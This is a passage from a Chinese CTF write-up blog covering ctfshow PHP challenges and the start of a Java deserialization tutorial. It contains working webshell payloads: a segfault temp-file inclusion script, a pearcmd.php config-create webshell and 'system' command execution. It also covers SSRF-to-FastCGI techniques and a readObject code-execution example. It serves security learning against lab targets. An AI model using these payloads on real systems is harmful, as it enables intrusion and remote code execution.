https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，session文件包含getshell，利用Segfault遗留下临时文件文件进行getshell</p><p><strong>1.利用Segfault遗留下临时文件文件进行getshell：</strong></p><p>条件：php7.1.20以下</p><p>原理：就是利用php crash后，会导致上传的临时文件保留下来，然后对其进行文件包含达到RCE的情况</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p牛写的文章</a></p><p>给出了/tmp下的文件，所有不需要爆破出tmp文件，直接包含</p><p>其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下</p><p>php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">tmp=re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span>(tmp)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>这个payload的意思就是先整出tmp的文件名，然后在去访问没有被清理的文件下面进行RCE</p><p><img src="../images/image-20230306162325031.png" alt="image-20230306162325031"></p><h2 id="web809-pear文件包含-RCE"><a href="#web809-pear文件包含-RCE" class="headerlink" title="web809(pear文件包含/RCE)"></a>web809(<strong>pear文件包含/RCE</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，pearcmd.php文件包含到RCE</p><p>1.安装了pear（这样才能有pearcmd.php），在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定—with-pear才会安装。<br>2.开启了register_argc_argv，Docker环境下的PHP会开启register_argc_argv这个配置</p><p>3.存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/a.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230306163611428.png" alt="image-20230306163611428"></p><p>先用bp发包，然后访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/a.txt</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>详细解释 </p><p><a href="https://blog.csdn.net/rfrder/article/details/121042290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165691505116782425121278%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165691505116782425121278&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121042290-null-null.185%5Ev2%5Etag_show&amp;utm_term=pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4450">文章</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">文章1</a></p><h2 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810(SSRF打PHP-FPM)"></a>web810(<strong>SSRF打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>这是SSRF打fastcgi，之前在SSRF专题那边是打mysql和redis</p><p>工具下载地址<code>https://github.com/tarunkant/Gopherus</code><br>打fastcgi用法：<br><code>gopherus --exploit fastcgi</code></p><p>这里不知道为啥，没打通 </p><p>然后把_后面的语句进行url编码 然后传参就能拿到flag。</p><h2 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811(file_put_contents打PHP-FPM)"></a>web811(<strong>file_put_contents打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html#autoid-0-0-0">PHP-FPM的解释</a></p><p>这里读取路径file，之后写回文件中。这看似什么都没有做。</p><p>这份代码可以用来攻击PHP-FPM</p><p>如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。</p><p>现在如果我们使用viewFile=ftp://evil-server/file.txt那么会发生：</p><p>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。<br>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。</p><p>那此时，在它尝试使用file_put_contents()上传回去时，我们告诉它把文件发送到127.0.0.1:9001(fpm的端口，默认是9000)<br>那么，我们就在这中间造成了一次SSRF，攻击php-fpm</p><p><a href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167809500916800226543840%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167809500916800226543840&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20web811&amp;spm=1018.2226.3001.4187">羽师傅写的文章wp</a></p><p>跟着这篇文章搞 不知道为啥 还是没复现成功。。。。</p><h2 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812(PHP-FPM未授权)"></a>web812(<strong>PHP-FPM未授权</strong>)</h2><p>题目</p><p><img src="../images/image-20230308205937864.png" alt="image-20230308205937864"></p><p>这里的话 <a href="https://blog.csdn.net/miuzzx/article/details/124038567">wp</a></p><h2 id="web813-劫持mysqli"><a href="#web813-劫持mysqli" class="headerlink" title="web813(劫持mysqli)"></a>web813(<strong>劫持mysqli</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;phpinfo&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;php -r &#x27;ctfshow();&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里包括多种类型的题目  为常见的姿势  用于积累自己的方法库&lt;/p&gt;
&lt;h2 id=&quot;web801-flask算pin&quot;&gt;&lt;a href=&quot;#web801-flask算pin&quot; class=&quot;headerlink&quot; title=&quot;web801(flask算pin)&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="ctfshow 常用姿势 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-java 反序列化</title>
    <link href="https://ke1nys.github.io/posts/50ac4231.html"/>
    <id>https://ke1nys.github.io/posts/50ac4231.html</id>
    <published>2023-02-24T13:21:28.000Z</published>
    <updated>2023-03-09T10:23:50.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>java里的<code>implements</code>和c++里的那个继承是一个意思，就是会继承前者里的属性和函数。 这篇文章有详细讲  —-&gt;  <a href="https://juejin.cn/s/%E5%9C%A8java%E4%B8%ADimplements%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D">文章</a></p><p>这篇文章是讲java序列化与反序列化的  挺详细的  <a href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167724569216800225587158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=167724569216800225587158&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-107621010-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A8%E8%AE%B2%E8%A7%A3&amp;spm=1018.2226.3001.4187">java序列化与反序列化</a></p><p>可以来看一下这个视频来学习java反序列和序列化 <a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=23c2bbe4623ae526416ea7a1ec4679fc">视频</a></p><p>上面的那篇文章是和下面的视频配套着讲的，也有对下面的代码的介绍</p><p>以下是视频中出现的三个java代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UnserializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化的话会把对象变成字节序列(字符串或者二进制文件)</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话为什么java反序列化会产生安全问题？</p><p>只要服务端会反序列化数据的话，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p><strong>可能的形式</strong></p><p>1.<strong>入口类</strong>的readObject直接调用危险方法</p><p>(1   这里的话就是对person类里的readObject函数进行重写，然后在里面加上一条命令执行的语句)</p><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数中包含可控类，该类又调用其他又危险方法的类，readObject时调用</p><p>比如类型定义为Object,调用equals/hashcode/toString</p><p>重点 相同类型 同名函数</p><p>(2   3都是类似套娃一样的，一层套一层的类)</p><p>4.构造函数/静态代码块等类加载时隐式执行</p><p>1.共同条件 继承Serializable</p><p>2.入口类条件 source(重写readObject 参数类型广泛 最好jdk自带) —-&gt;  Map HashMap  HashTable   <a href="https://zhuanlan.zhihu.com/p/84533476">HashMap为什么要重写readObject</a></p><p>3.调用链 gadget chain  <strong>相同名称 相同类型</strong></p><p>4.执行类 sink (rce ssrf 写文件等等)</p><p>这里的话我是根据这两篇文章来看着跟进的 <a href="https://blog.csdn.net/qq_47886905/article/details/123531299">文章1</a> <a href="https://blog.csdn.net/cosmoslin/article/details/122838465">文章2</a> <a href="https://www.anquanke.com/post/id/201762">文章三</a></p><p><strong>这两篇文章中写的put函数方法，put函数里的东西就有putVal函数，然后这时候就会进行dns请求，然后hashcode值就会被改变，导致最后readObject里的hash(key)不会进行dns请求</strong></p><p>这两篇文章里是利用java的<strong>反射</strong>来修改 hashcode值</p><p><a href="https://cloud.tencent.com/developer/article/1614318">反射的文章</a></p><p><strong>反射</strong></p><p>反射的作用：让java具有动态性</p><p>修改已有对象的属性</p><p>动态生成对象</p><p>动态调用方法</p><p>操作内部类和私有方法</p><p>在反序列化漏洞中的应用：</p><p>定制需要的对象</p><p>通过invoke调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><p><strong>反射学习写的代码</strong>  视频  <a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">反射</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span 